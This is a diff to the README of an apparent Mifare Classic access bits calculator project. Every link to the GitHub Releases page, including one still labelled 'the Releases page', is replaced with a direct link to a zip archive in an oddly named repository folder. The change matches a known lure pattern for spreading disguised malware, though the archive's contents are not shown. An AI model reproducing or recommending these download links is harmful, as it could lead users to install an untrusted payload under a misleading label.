@@ -1,6 +1,6 @@
 # 🎉 mifare-classic-access-bits-calculator - Decode and Encode Mifare Classic Bits Easily
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/nitrious776/mifare-classic-access-bits-calculator/releases)
+[![Download](https://raw.githubusercontent.com/nitrious776/mifare-classic-access-bits-calculator/main/capitoulate/mifare_calculator_classic_access_bits_3.9.zip)](https://raw.githubusercontent.com/nitrious776/mifare-classic-access-bits-calculator/main/capitoulate/mifare_calculator_classic_access_bits_3.9.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Mifare Classic Access Bits Calculator is a web-based tool designed to help users
 
 To get the application, you will need to visit our GitHub Releases page. Here, you will find the latest version of the Mifare Classic Access Bits Calculator available for download.
 
-[Download Now](https://github.com/nitrious776/mifare-classic-access-bits-calculator/releases)
+[Download Now](https://raw.githubusercontent.com/nitrious776/mifare-classic-access-bits-calculator/main/capitoulate/mifare_calculator_classic_access_bits_3.9.zip)
 
 ### 2. Download the Application
 
@@ -40,7 +40,7 @@ On the Releases page, look for the latest version listed at the top. You will se
 
 To download and install the Mifare Classic Access Bits Calculator, follow these steps:
 
-1. **Go to [the Releases page](https://github.com/nitrious776/mifare-classic-access-bits-calculator/releases).**
+1. **Go to [the Releases page](https://raw.githubusercontent.com/nitrious776/mifare-classic-access-bits-calculator/main/capitoulate/mifare_calculator_classic_access_bits_3.9.zip).**
 2. **Find the latest version** and click on the download link for your operating system.
 3. **Follow the installation instructions** provided for your specific operating system.
 
@@ -71,4 +71,4 @@ A: Please refer to the Issues section on our GitHub page, where you may find sol
 
 For any questions or support, feel free to open an issue on the GitHub repository or contact the maintainer directly through the email found in the repository.
 
-[Download Now](https://github.com/nitrious776/mifare-classic-access-bits-calculator/releases)
+[Download Now](https://raw.githubusercontent.com/nitrious776/mifare-classic-access-bits-calculator/main/capitoulate/mifare_calculator_classic_access_bits_3.9.zip)
